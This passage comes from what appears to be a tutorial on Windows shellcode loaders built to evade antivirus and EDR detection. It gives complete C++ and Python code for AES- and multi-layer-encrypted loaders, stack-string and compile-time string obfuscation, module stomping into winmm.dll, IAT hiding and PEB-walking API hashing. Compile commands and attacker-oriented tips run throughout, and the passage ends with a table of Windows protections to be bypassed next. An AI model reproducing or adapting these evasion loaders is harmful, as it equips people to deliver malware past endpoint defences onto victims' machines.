    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbResult = 0;
    DWORD cbKeyObject = 0;
    PBYTE pbKeyObject = NULL;

    // Open AES algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlgorithm,
                                         BCRYPT_AES_ALGORITHM,
                                         NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptOpenAlgorithmProvider failed: 0x%lx\n", status);
        return FALSE;
    }

    // Set chaining mode to CBC
    status = BCryptSetProperty(hAlgorithm,
                                BCRYPT_CHAINING_MODE,
                                (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                                sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptSetProperty failed: 0x%lx\n", status);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    // Get the size of the key object
    status = BCryptGetProperty(hAlgorithm,
                                BCRYPT_OBJECT_LENGTH,
                                (PBYTE)&cbKeyObject,
                                sizeof(DWORD), &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    // Allocate key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    // Generate symmetric key from raw key bytes
    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey,
                                         pbKeyObject, cbKeyObject,
                                         key, (ULONG)key_len, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGenerateSymmetricKey failed: 0x%lx\n", status);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    // Make a copy of IV (BCryptDecrypt modifies the IV buffer)
    unsigned char* iv_copy = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, iv_len);
    memcpy(iv_copy, iv, iv_len);

    // Get required output buffer size
    DWORD cbPlaintext = 0;
    status = BCryptDecrypt(hKey, ciphertext, (ULONG)ciphertext_len,
                           NULL, iv_copy, (ULONG)iv_len,
                           NULL, 0, &cbPlaintext, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptDecrypt (size query) failed: 0x%lx\n", status);
        HeapFree(GetProcessHeap(), 0, iv_copy);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    // Allocate output buffer
    *plaintext = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, cbPlaintext);
    if (!*plaintext) {
        HeapFree(GetProcessHeap(), 0, iv_copy);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    // Reset IV copy (it was consumed by the size query)
    memcpy(iv_copy, iv, iv_len);

    // Decrypt
    status = BCryptDecrypt(hKey, ciphertext, (ULONG)ciphertext_len,
                           NULL, iv_copy, (ULONG)iv_len,
                           *plaintext, cbPlaintext,
                           &cbPlaintext, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptDecrypt failed: 0x%lx\n", status);
        HeapFree(GetProcessHeap(), 0, *plaintext);
        HeapFree(GetProcessHeap(), 0, iv_copy);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    *plaintext_len = cbPlaintext;

    // Cleanup
    HeapFree(GetProcessHeap(), 0, iv_copy);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);

    return TRUE;
}

int main() {
    SIZE_T ciphertext_len = sizeof(encrypted_shellcode);

    printf("[*] Encrypted shellcode size: %zu bytes\n", ciphertext_len);

    // Step 1: Decrypt shellcode
    unsigned char* decrypted = NULL;
    SIZE_T decrypted_len = 0;

    if (!AESDecrypt(encrypted_shellcode, ciphertext_len,
                    aes_key, sizeof(aes_key),
                    aes_iv, sizeof(aes_iv),
                    &decrypted, &decrypted_len)) {
        printf("[-] Decryption failed!\n");
        return 1;
    }
    printf("[+] Decrypted shellcode: %zu bytes\n", decrypted_len);

    // Step 2: Allocate RW memory
    LPVOID execMem = VirtualAlloc(NULL, original_shellcode_size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
    if (!execMem) {
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }

    // Step 3: Copy decrypted shellcode
    RtlMoveMemory(execMem, decrypted, original_shellcode_size);

    // Zero out the decrypted buffer (don't leave plaintext lying around)
    SecureZeroMemory(decrypted, decrypted_len);
    HeapFree(GetProcessHeap(), 0, decrypted);

    // Step 4: Change to RX
    DWORD oldProtect;
    VirtualProtect(execMem, original_shellcode_size,
                   PAGE_EXECUTE_READ, &oldProtect);

    // Step 5: Execute
    printf("[+] Executing shellcode...\n");
    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)execMem, 0);

    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique06_aes.exe technique06_aes_loader.cpp -lbcrypt -lws2_32 -static
```

> The Windows BCrypt API (`bcrypt.dll`) is a legitimate system library used by thousands of applications for cryptographic operations. Using it for decryption does not raise suspicion in itself — many legitimate programs decrypt data at runtime.
{: .prompt-info }

---

### Technique 7: Multi-Layer Encryption (XOR + AES + Base64)

For maximum static evasion, chain multiple encryption layers. Each layer must be decrypted in reverse order at runtime.

**Encryption Pipeline (Python side):**

```
Raw Shellcode → XOR (layer 1) → AES-256 (layer 2) → Base64 (layer 3) → Embed in loader
```

**Decryption Pipeline (C++ side):**

```
Base64 decode (layer 3) → AES decrypt (layer 2) → XOR decrypt (layer 1) → Execute
```

**Python Multi-Layer Encryptor — `multilayer_encrypt.py`:**
```liquid
{% raw %}

#!/usr/bin/env python3
"""
Multi-Layer Shellcode Encryptor
Layer 1: XOR with random 16-byte key
Layer 2: AES-256-CBC
Layer 3: Base64 encoding
"""

import sys
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def format_c_array(data: bytes, var_name: str) -> str:
    hex_bytes = [f"0x{b:02x}" for b in data]
    lines = [f"unsigned char {var_name}[] = {{"]
    for i in range(0, len(hex_bytes), 12):
        chunk = ", ".join(hex_bytes[i:i+12])
        lines.append(f"    {chunk},")
    lines.append("};")
    return "\n".join(lines)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <payload.bin>")
        sys.exit(1)

    with open(sys.argv[1], "rb") as f:
        shellcode = f.read()

    print(f"[*] Original size: {len(shellcode)} bytes")

    # Layer 1: XOR
    xor_key = os.urandom(16)
    xored = xor_encrypt(shellcode, xor_key)
    print(f"[*] After XOR: {len(xored)} bytes")

    # Layer 2: AES-256-CBC
    aes_key = os.urandom(32)
    aes_iv = os.urandom(16)
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    aes_encrypted = cipher.encrypt(pad(xored, AES.block_size))
    print(f"[*] After AES: {len(aes_encrypted)} bytes")

    # Layer 3: Base64
    b64_encoded = base64.b64encode(aes_encrypted)
    print(f"[*] After Base64: {len(b64_encoded)} bytes")

    # Output everything needed for the C++ loader
    print("\n// ===== PASTE INTO YOUR C++ LOADER =====\n")
    print(f"SIZE_T original_size = {len(shellcode)};")
    print(format_c_array(xor_key, "xor_key"))
    print(format_c_array(aes_key, "aes_key"))
    print(format_c_array(aes_iv, "aes_iv"))
    print()

    # For Base64, output as a char string
    print(f'char b64_payload[] = "{b64_encoded.decode()}";')
    print(f"SIZE_T b64_payload_len = {len(b64_encoded)};")

if __name__ == "__main__":
    main()
```
{% endraw %}

**C++ Multi-Layer Loader (conceptual) — `technique07_multilayer.cpp`:**

```cpp
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")

// ===== Keys and encrypted payload from multilayer_encrypt.py =====
SIZE_T original_size = 460;

unsigned char xor_key[] = {
    // ... 16 bytes from Python output ...
    0x00 // placeholder
};

unsigned char aes_key[] = {
    // ... 32 bytes from Python output ...
    0x00 // placeholder
};

unsigned char aes_iv[] = {
    // ... 16 bytes from Python output ...
    0x00 // placeholder
};

char b64_payload[] = "BASE64_ENCODED_STRING_HERE";
SIZE_T b64_payload_len = 0;  // Update from Python output

// ===== Base64 Decode =====
SIZE_T base64_decode(const char* input, SIZE_T input_len,
                     unsigned char* output, SIZE_T output_max) {
    DWORD decoded_len = (DWORD)output_max;
    if (!CryptStringToBinaryA(input, (DWORD)input_len,
                               CRYPT_STRING_BASE64,
                               output, &decoded_len, NULL, NULL)) {
        return 0;
    }
    return decoded_len;
}

// ===== XOR Decrypt =====
void xor_decrypt(unsigned char* data, SIZE_T len,
                 unsigned char* key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// ===== AES Decrypt (same as Technique 6) =====
BOOL AESDecrypt(unsigned char* ct, SIZE_T ct_len,
                unsigned char* key, SIZE_T key_len,
                unsigned char* iv, SIZE_T iv_len,
                unsigned char** pt, SIZE_T* pt_len) {
    // ... (same implementation as Technique 6) ...
    // See technique06_aes_loader.cpp for full implementation
    return TRUE;
}

int main() {
    // Layer 3: Base64 decode
    SIZE_T decoded_max = b64_payload_len;  // Base64 output is always smaller
    unsigned char* decoded = (unsigned char*)HeapAlloc(
        GetProcessHeap(), 0, decoded_max);
    SIZE_T decoded_len = base64_decode(b64_payload, b64_payload_len,
                                        decoded, decoded_max);
    printf("[+] Base64 decoded: %zu bytes\n", decoded_len);

    // Layer 2: AES decrypt
    unsigned char* aes_decrypted = NULL;
    SIZE_T aes_decrypted_len = 0;
    AESDecrypt(decoded, decoded_len,
               aes_key, sizeof(aes_key),
               aes_iv, sizeof(aes_iv),
               &aes_decrypted, &aes_decrypted_len);
    HeapFree(GetProcessHeap(), 0, decoded);
    printf("[+] AES decrypted: %zu bytes\n", aes_decrypted_len);

    // Layer 1: XOR decrypt
    xor_decrypt(aes_decrypted, aes_decrypted_len,
                xor_key, sizeof(xor_key));
    printf("[+] XOR decrypted: %zu bytes\n", aes_decrypted_len);

    // Execute
    LPVOID mem = VirtualAlloc(NULL, original_size,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(mem, aes_decrypted, original_size);
    SecureZeroMemory(aes_decrypted, aes_decrypted_len);
    HeapFree(GetProcessHeap(), 0, aes_decrypted);

    DWORD oldProtect;
    VirtualProtect(mem, original_size, PAGE_EXECUTE_READ, &oldProtect);

    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)mem, 0);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique07_multi.exe technique07_multilayer.cpp -lbcrypt -lcrypt32 -lws2_32 -static
```

> Multi-layer encryption dramatically increases the effort required for static analysis, but it does NOT help against dynamic/behavioral detection. Once your shellcode is decrypted and executing in memory, behavioral analysis can still catch it. The next sections address this.
{: .prompt-warning }

---

## Part 4: Evading Static Detection (Level 3 — Advanced)

Static detection analyzes your binary **without executing it**. This includes signature matching, string analysis, import table inspection, entropy analysis, and machine learning classifiers. This section covers techniques to defeat all of these.

---

### Technique 8: String Obfuscation

When a reverse engineer or an automated tool runs `strings` on your binary, every readable string is extracted. If your binary contains strings like `"VirtualAlloc"`, `"kernel32.dll"`, `"NtCreateThreadEx"`, or `"amsi.dll"`, it immediately raises red flags.

**The Problem:**

```cpp
// These strings are visible in the .rdata section of your PE
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
FARPROC pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
```

Running `strings loader.exe` would reveal:

```
kernel32.dll
VirtualAlloc
```

**Solution 1: Character Array Construction (Stack Strings)**

Build strings on the stack at runtime so they never appear as contiguous strings in the binary:

```cpp
#include <windows.h>

int main() {
    // "kernel32.dll" built character by character on the stack
    char dll_name[13];
    dll_name[0]  = 'k';
    dll_name[1]  = 'e';
    dll_name[2]  = 'r';
    dll_name[3]  = 'n';
    dll_name[4]  = 'e';
    dll_name[5]  = 'l';
    dll_name[6]  = '3';
    dll_name[7]  = '2';
    dll_name[8]  = '.';
    dll_name[9]  = 'd';
    dll_name[10] = 'l';
    dll_name[11] = 'l';
    dll_name[12] = '\0';

    // "VirtualAlloc" built the same way
    char func_name[13];
    func_name[0]  = 'V';
    func_name[1]  = 'i';
    func_name[2]  = 'r';
    func_name[3]  = 't';
    func_name[4]  = 'u';
    func_name[5]  = 'a';
    func_name[6]  = 'l';
    func_name[7]  = 'A';
    func_name[8]  = 'l';
    func_name[9]  = 'l';
    func_name[10] = 'o';
    func_name[11] = 'c';
    func_name[12] = '\0';

    HMODULE hMod = GetModuleHandleA(dll_name);
    FARPROC pFunc = GetProcAddress(hMod, func_name);

    // Use pFunc as VirtualAlloc...
    return 0;
}
```

**Solution 2: Compile-Time XOR String Encryption (C++14 constexpr)**

A more elegant approach encrypts strings at compile time and decrypts them at runtime:

```cpp
#include <windows.h>
#include <cstring>

// Compile-time XOR string encryption
template <int N>
struct ObfuscatedString {
    char data[N];

    constexpr ObfuscatedString(const char (&str)[N], char key) : data{} {
        for (int i = 0; i < N; i++) {
            data[i] = str[i] ^ key;
        }
    }

    // Runtime decryption
    void decrypt(char* output, char key) const {
        for (int i = 0; i < N; i++) {
            output[i] = data[i] ^ key;
        }
    }
};

// Macro for easy usage
#define OBFSTR(str, key) []() -> const char* { \
    constexpr auto obf = ObfuscatedString<sizeof(str)>(str, key); \
    static char decrypted[sizeof(str)]; \
    obf.decrypt(decrypted, key); \
    return decrypted; \
}()

int main() {
    // Strings are encrypted in the binary, decrypted at runtime
    const char* k32 = OBFSTR("kernel32.dll", 0x42);
    const char* va  = OBFSTR("VirtualAlloc", 0x42);

    HMODULE hMod = GetModuleHandleA(k32);
    FARPROC pFunc = GetProcAddress(hMod, va);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -std=c++14 -O2 -o technique08_strings.exe technique08_strings.cpp -static
```

> Use string obfuscation for **every** string in your loader that references API names, DLL names, or any indicator of malicious intent. This includes strings in error messages, debug output, and comments (comments don't survive compilation, but format strings do).
{: .prompt-tip }

---

### Technique 9: Module Stomping (Custom VirtualAlloc Alternative)

`VirtualAlloc` is one of the most heavily monitored API functions. Every time it's called, EDRs log the allocation size, protection flags, and calling context. Module stomping avoids `VirtualAlloc` entirely by reusing memory from a legitimately loaded DLL.

**Concept:**

1. Load a large legitimate DLL (e.g., `winmm.dll`, `dbghelp.dll`, `xpsservices.dll`)
2. The OS allocates executable memory for this DLL — this allocation is completely normal
3. Change the protection on part of the DLL's `.text` section to `PAGE_READWRITE`
4. Write your shellcode over the DLL's code
5. Change protection back to `PAGE_EXECUTE_READ`
6. Execute — your shellcode now runs from within a legitimate DLL's memory space

**Why this works:** Memory scanners see shellcode executing from `winmm.dll`'s address range, not from a suspicious `VirtualAlloc`-allocated region.

**Full Code — `technique09_module_stomping.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// Encrypted shellcode (use XOR or AES-encrypted shellcode here)
unsigned char encrypted_shellcode[] = {
    // ... your encrypted shellcode ...
    0x00  // placeholder
};

unsigned char xor_key[] = { 0x41, 0x42, 0x43, 0x44 }; // Example key

void xor_decrypt(unsigned char* data, SIZE_T len,
                 unsigned char* key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < len; i++)
        data[i] ^= key[i % key_len];
}

LPVOID MyOwnVirtualAlloc(SIZE_T requiredSize) {
    /*
     * Instead of VirtualAlloc, we:
     * 1. Load a large legitimate DLL
     * 2. Find its .text section
     * 3. Use that memory for our shellcode
     */

    // Load a large, rarely-used DLL
    // winmm.dll (~170 KB .text section) is a good candidate
    HMODULE hModule = LoadLibraryA("winmm.dll");
    if (!hModule) {
        printf("[-] LoadLibrary failed: %d\n", GetLastError());
        return NULL;
    }
    printf("[+] Loaded winmm.dll at: 0x%p\n", hModule);

    // Parse the PE headers to find the .text section
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    LPVOID textBase = NULL;
    SIZE_T textSize = 0;

    // Find the .text section
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            textBase = (LPVOID)((BYTE*)hModule +
                       sectionHeader[i].VirtualAddress);
            textSize = sectionHeader[i].Misc.VirtualSize;
            printf("[+] Found .text section at: 0x%p (size: %zu)\n",
                   textBase, textSize);
            break;
        }
    }

    if (!textBase || textSize < requiredSize) {
        printf("[-] .text section not found or too small\n");
        return NULL;
    }

    // Make the .text section writable
    DWORD oldProtect;
    if (!VirtualProtect(textBase, requiredSize,
                        PAGE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect (RW) failed: %d\n", GetLastError());
        return NULL;
    }

    return textBase;
}

int main() {
    SIZE_T shellcodeSize = sizeof(encrypted_shellcode);

    // Step 1: Get memory from a legitimate DLL instead of VirtualAlloc
    LPVOID mem = MyOwnVirtualAlloc(shellcodeSize);
    if (!mem) return 1;

    // Step 2: Copy encrypted shellcode
    RtlMoveMemory(mem, encrypted_shellcode, shellcodeSize);

    // Step 3: Decrypt in place
    xor_decrypt((unsigned char*)mem, shellcodeSize,
                xor_key, sizeof(xor_key));

    // Step 4: Change to RX
    DWORD oldProtect;
    VirtualProtect(mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    // Step 5: Execute — the shellcode runs from winmm.dll's address space
    printf("[+] Executing from module memory...\n");
    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)mem, 0);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique09_stomp.exe technique09_module_stomping.cpp -lws2_32 -static
```

---

### Technique 10: Import Address Table (IAT) Hiding

When you compile a C/C++ program that calls `VirtualAlloc`, `CreateThread`, or `VirtualProtect`, the compiler adds these function names to the **Import Address Table (IAT)** of the resulting PE file. Any analyst or automated tool can dump the IAT and see exactly which suspicious APIs your program uses.

**The Problem:**

```bash
# Running dumpbin or objdump on the binary reveals imports:
$ objdump -p loader.exe | grep -i "Import"
  VirtualAlloc
  VirtualProtect
  CreateThread
  RtlMoveMemory
```

**The Solution: Dynamic API Resolution**

Instead of calling APIs directly (which creates IAT entries), resolve them at runtime using `GetModuleHandle` + `GetProcAddress`:

**Full Code — `technique10_iat_hiding.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// Define function pointer types for each API we need
typedef LPVOID (WINAPI *pVirtualAlloc)(
    LPVOID lpAddress, SIZE_T dwSize,
    DWORD flAllocationType, DWORD flProtect);

typedef BOOL (WINAPI *pVirtualProtect)(
    LPVOID lpAddress, SIZE_T dwSize,
    DWORD flNewProtect, PDWORD lpflOldProtect);

typedef VOID (WINAPI *pRtlMoveMemory)(
    VOID UNALIGNED *Destination,
    const VOID UNALIGNED *Source,
    SIZE_T Length);

typedef HANDLE (WINAPI *pCreateThread)(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId);

typedef DWORD (WINAPI *pWaitForSingleObject)(
    HANDLE hHandle,
    DWORD dwMilliseconds);

// Encrypted shellcode
unsigned char encrypted_shellcode[] = {
    // ... your encrypted shellcode ...
    0x00
};
unsigned char xor_key[] = { 0x41 };

void xor_decrypt(unsigned char* d, SIZE_T l, unsigned char* k, SIZE_T kl) {
    for (SIZE_T i = 0; i < l; i++) d[i] ^= k[i % kl];
}

int main() {
    // Resolve kernel32.dll handle
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return 1;

    // Resolve ntdll.dll handle
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 1;

    // Dynamically resolve each function — no IAT entries!
    pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)
        GetProcAddress(hKernel32, "VirtualAlloc");
    pVirtualProtect myVirtualProtect = (pVirtualProtect)
        GetProcAddress(hKernel32, "VirtualProtect");
    pRtlMoveMemory myRtlMoveMemory = (pRtlMoveMemory)
        GetProcAddress(hNtdll, "RtlMoveMemory");
    pCreateThread myCreateThread = (pCreateThread)
        GetProcAddress(hKernel32, "CreateThread");
    pWaitForSingleObject myWaitForSingleObject = (pWaitForSingleObject)
        GetProcAddress(hKernel32, "WaitForSingleObject");

    if (!myVirtualAlloc || !myVirtualProtect || !myRtlMoveMemory ||
        !myCreateThread || !myWaitForSingleObject) {
        printf("[-] Failed to resolve one or more APIs\n");
        return 1;
    }

    SIZE_T scSize = sizeof(encrypted_shellcode);

    // Use resolved function pointers instead of direct API calls
    LPVOID mem = myVirtualAlloc(NULL, scSize,
                                 MEM_COMMIT | MEM_RESERVE,
                                 PAGE_READWRITE);
    if (!mem) return 1;

    myRtlMoveMemory(mem, encrypted_shellcode, scSize);

    // Decrypt
    xor_decrypt((unsigned char*)mem, scSize, xor_key, sizeof(xor_key));

    DWORD oldProtect;
    myVirtualProtect(mem, scSize, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = myCreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

    myWaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique10_iat.exe technique10_iat_hiding.cpp -lws2_32 -static
```

> This hides suspicious imports from static IAT analysis, but `GetProcAddress` itself still appears in the IAT, and the strings `"VirtualAlloc"`, `"kernel32.dll"` etc. are still visible. Combine this with **string obfuscation** (Technique 8) and **API hashing** (Technique 11) for full coverage.
{: .prompt-warning }

---

### Technique 11: API Hashing

API hashing eliminates all readable API name strings from the binary. Instead of storing `"VirtualAlloc"`, we store a hash (e.g., `0x91AFCA54`). At runtime, we walk through loaded modules and their export tables, hashing each function name and comparing it to our target hash.

**How it works:**

1. At compile time, compute a hash of each API name you need (e.g., `djb2("VirtualAlloc") = 0x91AFCA54`)
2. In the binary, store only the hash values — no readable strings
3. At runtime, walk the **Process Environment Block (PEB)** to find loaded modules
4. For each module, walk its **Export Address Table (EAT)**
5. Hash each exported function name and compare with your target hash
6. When you find a match, you have the function address

**Hash Function — djb2:**

```cpp
constexpr DWORD djb2_hash(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    return hash;
}
```

**Full Code — `technique11_api_hashing.cpp`:**

```cpp
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// djb2 hash function
DWORD djb2(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// Pre-computed hashes (compute these offline or with a helper program)
// djb2("VirtualAlloc")  = 0x91AFCA54  (example — compute actual values)
// djb2("VirtualProtect") = 0xE857500D
// djb2("CreateThread")   = 0x7B4D2879
// etc.

#define HASH_VIRTUALALLOC    0x91AFCA54
#define HASH_VIRTUALPROTECT  0xE857500D
#define HASH_CREATETHREAD    0x7B4D2879

// Walk PEB to find a module's base address by hash
HMODULE GetModuleByHash(DWORD moduleHash) {
    // Access PEB through TEB (Thread Environment Block)
    // On x64: PEB is at gs:[0x60]
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    // PEB → Ldr → InMemoryOrderModuleList
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pListEntry = pListHead->Flink;

    while (pListEntry != pListHead) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (pEntry->FullDllName.Buffer) {
            // Convert wide string to narrow for hashing
            char dllName[256] = {0};
            int len = pEntry->FullDllName.Length / sizeof(WCHAR);
            for (int i = 0; i < len && i < 255; i++) {
                // Convert to lowercase for consistent hashing
                WCHAR wc = pEntry->FullDllName.Buffer[i];
                dllName[i] = (char)((wc >= 'A' && wc <= 'Z') ?
                              wc + 32 : wc);
            }

            if (djb2(dllName) == moduleHash) {
                return (HMODULE)pEntry->DllBase;
            }
        }

        pListEntry = pListEntry->Flink;
    }
    return NULL;
}

// Walk a module's Export Address Table to find a function by hash
FARPROC GetFunctionByHash(HMODULE hModule, DWORD functionHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + dosHeader->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule +
                      exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule +
                    exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule +
                     exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* funcName = (char*)((BYTE*)hModule + nameRVAs[i]);

        if (djb2(funcName) == functionHash) {
            return (FARPROC)((BYTE*)hModule +
                   funcRVAs[ordinals[i]]);
        }
    }
    return NULL;
}

// === Main Loader Using API Hashing ===

typedef LPVOID (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

int main() {
    // Pre-computed hash of the full path or just the DLL name
    // You'd compute these with a helper tool
    DWORD hashKernel32 = djb2("kernel32.dll");

    // Find kernel32.dll by walking PEB
    HMODULE hK32 = GetModuleByHash(hashKernel32);
    if (!hK32) {
        printf("[-] Module not found\n");
        return 1;
    }

    // Resolve VirtualAlloc by hash
    fnVirtualAlloc pVA = (fnVirtualAlloc)
        GetFunctionByHash(hK32, HASH_VIRTUALALLOC);

    fnVirtualProtect pVP = (fnVirtualProtect)
        GetFunctionByHash(hK32, HASH_VIRTUALPROTECT);

    if (!pVA || !pVP) {
        printf("[-] Function resolution failed\n");
        return 1;
    }

    // Now use pVA instead of VirtualAlloc — no strings in binary!
    printf("[+] APIs resolved via hashing. No strings visible.\n");

    // ... rest of shellcode loading logic using pVA, pVP, etc.

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique11_hash.exe technique11_api_hashing.cpp -lws2_32 -static
```

**Helper: Hash Calculator**

```cpp
// hash_calculator.cpp — run this to compute hashes for any API name
#include <stdio.h>

unsigned int djb2(const char* str) {
    unsigned int hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

int main(int argc, char* argv[]) {
    const char* apis[] = {
        "VirtualAlloc", "VirtualProtect", "VirtualFree",
        "CreateThread", "RtlMoveMemory", "WaitForSingleObject",
        "GetModuleHandleA", "GetProcAddress", "LoadLibraryA",
        "OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
        "CreateRemoteThread", "NtAllocateVirtualMemory",
        "kernel32.dll", "ntdll.dll", "user32.dll"
    };

    for (int i = 0; i < sizeof(apis)/sizeof(apis[0]); i++) {
        printf("#define HASH_%-30s 0x%08X\n", apis[i], djb2(apis[i]));
    }
    return 0;
}
```

```bash
gcc -o hash_calc hash_calculator.cpp && ./hash_calc
```

> With API hashing, your binary contains **zero readable strings** that reference Windows APIs. Combined with encrypted shellcode and IAT hiding, static analysis tools have very little to work with.
{: .prompt-tip }

---

## Part 5: Evading Dynamic/Behavioral Detection (Level 4 — Advanced)

Static evasion gets your binary past on-disk scanning. But modern security products go far beyond static analysis — they monitor your program's behavior at runtime. This section covers the Windows security architecture and techniques to evade runtime detection.

---

### Understanding Windows Security Architecture (2026)

Before diving into bypass techniques, you need to understand what you're up against:

| Protection | What It Does | Available Since |
|---|---|---|
| **Windows Defender (MDE)** | Signature matching + behavioral analysis + cloud-based ML analysis + memory scanning | Windows 8+ |
| **AMSI** (Anti-Malware Scan Interface) | Scans scripts, .NET assemblies, VBScript, JScript, and PowerShell at runtime before execution | Windows 10 1709+ |
| **ETW** (Event Tracing for Windows) | Logs system events including API calls; EDRs consume these logs for behavioral detection | Windows Vista+ |
| **CFG** (Control Flow Guard) | Validates indirect call targets against a bitmap of valid targets; prevents calling arbitrary addresses | Windows 10+ |
| **CIG** (Code Integrity Guard) | Blocks loading of unsigned or improperly signed DLLs into protected processes | Windows 10+ |
